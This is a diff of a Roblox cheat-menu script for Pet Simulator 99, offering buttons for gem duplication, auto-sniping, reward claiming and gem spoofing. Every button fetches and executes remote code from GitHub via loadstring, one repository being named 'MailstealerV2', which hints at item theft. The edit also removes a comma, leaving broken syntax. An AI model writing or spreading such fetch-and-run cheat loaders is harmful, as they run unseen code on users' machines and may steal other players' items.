@@ -29,11 +29,8 @@ CloseCallback = <function> - Function to execute when the window is closed.
 
 
 local Tab = Window:MakeTab({
-
-	Name = "SCRIPTS HUB",
-
+	Name = "SCRIPTS HUB"
 	Icon = "rbxassetid://4483345998",
-
 	PremiumOnly = false
 
 })
@@ -55,17 +52,11 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 
 
 Tab:AddButton({
-
 	Name = "VISUAL SCRIPTS",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/VisualHub/main/VisualPets"))()
-
       		print("button pressed")
-
   	end    
-
 })
 
 
@@ -83,19 +74,12 @@ Callback = <function> - The function of the button.
 
 
 Tab:AddToggle({
-
-	Name = "Auto Farm",
-
+Name = "Auto Farm",
 	Default = false,
-
 	Callback = function(Value)
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
 		print(Value)
-
 	end    
-
 })
 
 
@@ -115,17 +99,11 @@ Callback = <function> - The function of the toggle.
 
 
 Tab:AddButton({
-
 	Name = "AUTO CLAIM SOCIAL REWARD",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
       		print("button pressed")
-
   	end    
-
 })
 
 
@@ -141,17 +119,11 @@ Callback = <function> - The function of the button.
 
 
 Tab:AddButton({
-
 	Name = "AUTO CLAIM GROUP REWARD",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
-      		print("button pressed")
-
+    		print("button pressed")
   	end    
-
 })
 
 
@@ -171,17 +143,11 @@ Callback = <function> - The function of the button.
 
 
 Tab:AddButton({
-
 	Name = "AUTO CLAIM VIP REWARDS",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
       		print("button pressed")
-
   	end    
-
 })
 
 
@@ -199,17 +165,11 @@ Callback = <function> - The function of the button.
 
 
 Tab:AddButton({
-
 	Name = "AUTO CLAIM FREE GEMS",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
-      		print("button pressed")
-
+  		print("button pressed")
   	end    
-
 })
 
 
@@ -221,23 +181,6 @@ Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
 
 ]]
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -247,11 +190,8 @@ Callback = <function> - The function of the button.
 
 
 local Tab = Window:MakeTab({
-
 	Name = "Trading Plaza HUB",
-
 	Icon = "rbxassetid://4483345998",
-
 	PremiumOnly = false
 
 })
@@ -273,15 +213,10 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 
 
 Tab:AddButton({
-
 	Name = "Booth Gem Dupe",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
       		print("button pressed")
-
   	end    
 
 })
@@ -301,19 +236,12 @@ Callback = <function> - The function of the button.
 
 
 Tab:AddToggle({
-
 	Name = "Auto Snipe Huge/Exclusive/Egg/....",
-
 	Default = false,
-
 	Callback = function(Value)
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
 		print(Value)
-
 	end    
-
 })
 
 
@@ -335,17 +263,11 @@ Callback = <function> - The function of the toggle.
 
 
 Tab:AddButton({
-
 	Name = "AUTO SNIPE TITANIC",
-
 	Callback = function()
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
-      		print("button pressed")
-
+  		print("button pressed")
   	end    
-
 })
 
 
@@ -363,19 +285,12 @@ Callback = <function> - The function of the button.
 
 
 Tab:AddToggle({
-
 	Name = "Gem SPOOFING",
-
 	Default = false,
-
 	Callback = function(Value)
-
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
-
 		print(Value)
-
 	end    
-
 })
 
 
